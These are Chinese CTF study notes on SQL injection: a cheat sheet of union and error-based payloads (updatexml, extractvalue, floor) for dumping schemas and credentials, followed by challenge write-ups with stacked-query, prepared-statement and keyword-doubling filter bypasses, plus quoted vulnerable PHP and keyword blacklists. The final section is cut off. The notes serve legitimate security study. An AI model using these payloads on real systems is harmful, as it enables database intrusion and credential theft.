# SQL注入相关题目
## 注入姿势
### 常规注入
~~~sql
爆数据库名称
select schema_name from information_schema.schemata;
爆表名
select table_name from information_schema.tables where table_schema='dvwa';
爆字段名
select table_schema,column_name,table_name from information_schema.columns where table_name=users and table_schema='dvwa';

主机信息查询
select @@HOSTNAME; 主机名称
select @@datadir;——数据库路径
select @@version_compile_os;——操作系统版本
select @@hostname,@@datadir, @@version_compile_os;

数据库版本信息查询
Select VERSION();  数据库版本信息
Select @@VERSION;  数据库版本信息
Select @@GLOBAL.VERSION;  数据库版本信息
Select database();   数据库名称
select version(),@@version,@@global.version,database();

数据库用户信息查询
select user(); 系统用户和登录主机名
select current_user(); 当前登录用户和登录主机名
select system_user(); 数据库系统用户账户名称和登录主机名
select session_user(); 当前会话用户名和登录主机名
select user(),current_user(),system_user(),session_user();

联合查询
select * from dvwa.guestbook where name= 'test' and 1=2 union select 1,2,3;

concat,group_concat,concat_ws函数
concat和concat_ws的区别在于分隔符的不同
select concat(version(),user(),@@hostname);
~~~
### 报错注入
#### updatexml
~~~sql
爆数据库版本信息
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

链接用户
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

链接数据库
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

爆库
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆表
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆字段
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆字段内容
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)

爆表名
?id=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
爆列名
?id=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)#
爆字段
?id=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#
~~~

#### extractvalue
~~~sql
爆数据库
?id=1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #
爆表
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
爆字段
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) #
爆字段内容
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #
~~~

#### floor
~~~sql
爆数据库
?id=1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #
爆表
?id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#
爆字段
?id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#
爆内容
?id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x#
~~~
## [SUCTF 2019]EasySQL （堆叠诸如  猜测后台sql语句）
这道题比较新颖，直接放源码吧
~~~php
  <?php
    session_start();

    include_once "config.php";
    
    $post = array();
    $get = array();
    global $MysqlLink;
    
    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }
    
    foreach ($_POST as $k=>$v){
        if(!empty($v)&&is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=>$v){
        }
    }
    //die();
?>

<html>
<head>
</head>

<body>

<a> Give me your flag, I will tell you if the flag is right. </ a>
<form action="" method="post">
<input type="text" name="query">
<input type="submit">
</form>
</body>
</html>

<?php

    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])>40){
            die("Too long.");
        }
        $sql = "select ".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));
    
    }

?>
~~~
SQL执行语句是这样的
~~~php
$sql = "select ".$post['query']."||flag from Flag";
~~~
`||`在`sql`语句中是`或`的意思
但是在这里，我们需要将其进行重新定义
~~~sql
PIPES_AS_CONCAT	//将"||"视为字符串的连接操作符而非或运算符
作用实例：111||222 → 111222
~~~
本题有两种解法
1、改变`||`意义
`||`在`sql`语句中之所以能改变成连字符是因为`mysql`中的`@@sql_modesql_mode`
~~~payload
1;set sql_mode=PIPES_AS_CONCAT;select 1
~~~
2、不改变`||`的意义，按`或`进行使用
~~~payload
*,1
~~~
传入后，`sql`语句被拼接为
~~~sql
$sql = "select *,1||flag from Flag";
//作用等同于，因为	1||flag==1
$sql = "select *,1 from Flag";
~~~
3、堆叠注入
![00pKUO.png](https://s1.ax1x.com/2020/10/08/00pKUO.png)

## [极客大挑战 2019]EasySQL 1（万能密码）
这道题是一道万能密码登陆
![00CphF.png](https://s1.ax1x.com/2020/10/08/00CphF.png)
首先尝试`admin	admin`
![00CRCF.png](https://s1.ax1x.com/2020/10/08/00CRCF.png)
尝试单引号闭合`admin'	admin`，报错
![00CXgH.png](https://s1.ax1x.com/2020/10/08/00CXgH.png)
说明本题是单引号闭合
那么构造`payload`
~~~payload
username=admin' or '1'='1
password=admin' or '1'='1
~~~
解释一下`payload`构造的原理
上面已经判断出`sql`语句是单引号闭合
并且在`sql`中`admin or 1=1   ==  1`
![0DTyin.png](https://s1.ax1x.com/2020/10/09/0DTyin.png)
因此`payload`传入后，从数据库取出的用户名和密码就对我们可控
~~~sql
username=1
passowrd=1
~~~
所以在判断时一定正确，登陆成功。

## [强网杯 2019]随便注 1 (预编译绕过)
![0btKAg.png](https://s1.ax1x.com/2020/10/16/0btKAg.png)
首先判断注入方式
![0btmB8.png](https://s1.ax1x.com/2020/10/16/0btmB8.png)
![0btMNQ.png](https://s1.ax1x.com/2020/10/16/0btMNQ.png)
单引号闭合
发现有过滤
![0bNSvq.png](https://s1.ax1x.com/2020/10/16/0bNSvq.png)
用`burp`测试一下
![0btBC9.png](https://s1.ax1x.com/2020/10/16/0btBC9.png)
发现过滤不少，但是`extractvalue`没有被过滤
![0btk9A.png](https://s1.ax1x.com/2020/10/16/0btk9A.png)
爆出数据库
但是想要读数据就必须用`select`，但是`select`又被过滤了
这时就要用到预编译的方式插入`select`
### 预编译简单了解
预编译的初衷是预防`SQL`注入，emmmmmm
![0bHhgH.jpg](https://s1.ax1x.com/2020/10/16/0bHhgH.jpg)
`SQL`预编译语句语法

~~~sql
//定义预编译语句
PREPARE stmt_name FROM preparable_stmt;
//执行预编译语句
EXECUTE stmt_name [USING @var_name [, @var_name] ...];
~~~
举例
~~~sql
prepare add1 from 'select (?+?)';

set @a=1;
set @b=2;

execute add1 using @a,@b;
~~~
![0bbrRg.png](https://s1.ax1x.com/2020/10/16/0bbrRg.png)
这里可以利用预编译和`concat`将`select`拼接
并且`concat`没有被过滤
经过测试，堆叠注入是可以利用的
![0bjMCV.png](https://s1.ax1x.com/2020/10/16/0bjMCV.png)
~~~payload
-1';
set @sql = CONCAT('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;
#
~~~
![0bvLeH.png](https://s1.ax1x.com/2020/10/16/0bvLeH.png)
页面返回`strstr`进啊测到了`set`
而`strstr`函数是区分大小写的
![0bxoAs.png](https://s1.ax1x.com/2020/10/16/0bxoAs.png)
那么修改`payload`
~~~payload
-1';
set @sql = CONCAT('Se','lect * from `1919810931114514`;');
Prepare stmt from @sql;
EXECUTE stmt;
#
~~~
![0bxvB4.png](https://s1.ax1x.com/2020/10/16/0bxvB4.png)
得到`flag`

## [极客大挑战 2019]BabySQL 1（黑名单复写绕过）
首先测试万能密码得到`password`
[![BpOWXn.png](https://s1.ax1x.com/2020/10/20/BpOWXn.png)](https://imgchr.com/i/BpOWXn)
然而发现登陆后并没有什么用
[![BpOLc9.png](https://s1.ax1x.com/2020/10/20/BpOLc9.png)](https://imgchr.com/i/BpOLc9)
`sql`注入发现存在过滤
[![BpXNNT.png](https://s1.ax1x.com/2020/10/20/BpXNNT.png)](https://imgchr.com/i/BpXNNT)
[![BpXVBt.png](https://s1.ax1x.com/2020/10/20/BpXVBt.png)](https://imgchr.com/i/BpXVBt)
最后发现可以复写绕过
[![BpjSrn.png](https://s1.ax1x.com/2020/10/20/BpjSrn.png)](https://imgchr.com/i/BpjSrn)
[![BpjbLR.png](https://s1.ax1x.com/2020/10/20/BpjbLR.png)](https://imgchr.com/i/BpjbLR)
[![BpvefS.png](https://s1.ax1x.com/2020/10/20/BpvefS.png)](https://imgchr.com/i/BpvefS)
[![BpvdX9.png](https://s1.ax1x.com/2020/10/20/BpvdX9.png)](https://imgchr.com/i/BpvdX9)

~~~payload
?username=admin%27%23&password=admin
?username=ad1min' uniunionon selecselectt 1,2,database()%23&password=admin
?username=ad1min' uniunionon selecselectt 1,2,table_name frofromm infoorrmation_schema.tables whwhereere table_schema=database()%23&password=admin
?username=ad1min' uniunionon selecselectt 1,2,group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name='b4bsql'%23&password=admin
?username=ad1min' uniunionon selecselectt 1,2,group_concat(id,username,passwoorrd) frofromm b4bsql%23&password=admin
~~~

## [极客大挑战 2019]HardSQL 1（ 空格过滤使用()绕过  =过滤用like绕过）
这道题的`payload`不允许存在空格
[![BpxmAx.png](https://s1.ax1x.com/2020/10/20/BpxmAx.png)](https://imgchr.com/i/BpxmAx)
[![Bpx0gg.png](https://s1.ax1x.com/2020/10/20/Bpx0gg.png)](https://imgchr.com/i/Bpx0gg)
并且这道题没有回显点，尝试报错注入
[![BpxWCT.png](https://s1.ax1x.com/2020/10/20/BpxWCT.png)](https://imgchr.com/i/BpxWCT)
[![Bpxvxe.png](https://s1.ax1x.com/2020/10/20/Bpxvxe.png)](https://imgchr.com/i/Bpxvxe)
`updatexml`可以使用
[![B9SB0s.png](https://s1.ax1x.com/2020/10/20/B9SB0s.png)](https://imgchr.com/i/B9SB0s)
[![B9pSAI.png](https://s1.ax1x.com/2020/10/20/B9pSAI.png)](https://imgchr.com/i/B9pSAI)
[![B9pJb9.png](https://s1.ax1x.com/2020/10/20/B9pJb9.png)](https://imgchr.com/i/B9pJb9)
[![B9pOP0.png](https://s1.ax1x.com/2020/10/20/B9pOP0.png)](https://imgchr.com/i/B9pOP0)
但是发现`flag`是不全的
[![B9pTbj.png](https://s1.ax1x.com/2020/10/20/B9pTbj.png)](https://imgchr.com/i/B9pTbj)
[![B9pOP0.png](https://s1.ax1x.com/2020/10/20/B9pOP0.png)](https://imgchr.com/i/B9pOP0)
这是我们就可以取`flag`左右两部分进行拼接
~~~payload
?username=admi1n'or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23&password=admin
?username=admi1n'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=admin
?username=admi1n'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=admin
?username=admi1n'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23&password=admin
?username=admi1n'or(updatexml(1,concat(0x7e,(select(left(password,100))from(H4rDsq1)),0x7e),1))%23&password=admin
?username=admi1n'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&password=admin
~~~

## [GXYCTF2019]BabySQli 1 （联合查询虚拟表改变后台查询结果）
[![BPNFHO.png](https://s1.ax1x.com/2020/10/21/BPNFHO.png)](https://imgchr.com/i/BPNFHO)
[![BPNQDf.png](https://s1.ax1x.com/2020/10/21/BPNQDf.png)](https://imgchr.com/i/BPNQDf)
先进行一波`fuzz`
[![BPNUvq.png](https://s1.ax1x.com/2020/10/21/BPNUvq.png)](https://imgchr.com/i/BPNUvq)
发现大小写可以绕过，并且是单引号闭合
[![BPNg2R.png](https://s1.ax1x.com/2020/10/21/BPNg2R.png)](https://imgchr.com/i/BPNg2R)
[![BPNoIe.png](https://s1.ax1x.com/2020/10/21/BPNoIe.png)](https://imgchr.com/i/BPNoIe)


## 红日安全day1
~~~php
<?php
//index.php
include 'config.php';
$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("连接失败: ");
}

$sql = "SELECT COUNT(*) FROM users";
$whitelist = array();
$result = $conn->query($sql);
if($result->num_rows > 0){
    $row = $result->fetch_assoc();
    $whitelist = range(1, $row['COUNT(*)']);
}

$id = stop_hack($_GET['id']);
$sql = "SELECT * FROM users WHERE id=$id";

if (!in_array($id, $whitelist)) {
    die("id $id is not in whitelist.");
}

$result = $conn->query($sql);
if($result->num_rows > 0){
    $row = $result->fetch_assoc();
    echo "<center><table border='1'>";
    foreach ($row as $key => $value) {
        echo "<tr><td><center>$key</center></td><br>";
        echo "<td><center>$value</center></td></tr><br>";
    }
    echo "</table></center>";
}
else{
    die($conn->error);
}

?>
~~~
~~~php
<?php 
//config.php
$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "day1";

function stop_hack($value){
    $pattern = "insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval";
    $back_list = explode("|",$pattern);
    foreach($back_list as $hack){
        if(preg_match("/$hack/i", $value))
            die("$hack detected!");
    }
    return $value;
}
?>
~~~
本题使用了`in_array()`函数过滤`$id`
`$id`只允许存在的列被查询

~~~php
if($result->num_rows > 0){
    $row = $result->fetch_assoc();
    $whitelist = range(1, $row['COUNT(*)']);
}
...
...
...
if (!in_array($id, $whitelist)) {
    die("id $id is not in whitelist.");
}
~~~
`in_array()`函数缺陷为其第三个参数没有设置为`ture`，该参数默认关闭
开启后，进行强等于比较，否则开启若等于比较
详见`day1`笔记
因此`1' and 1=1`




































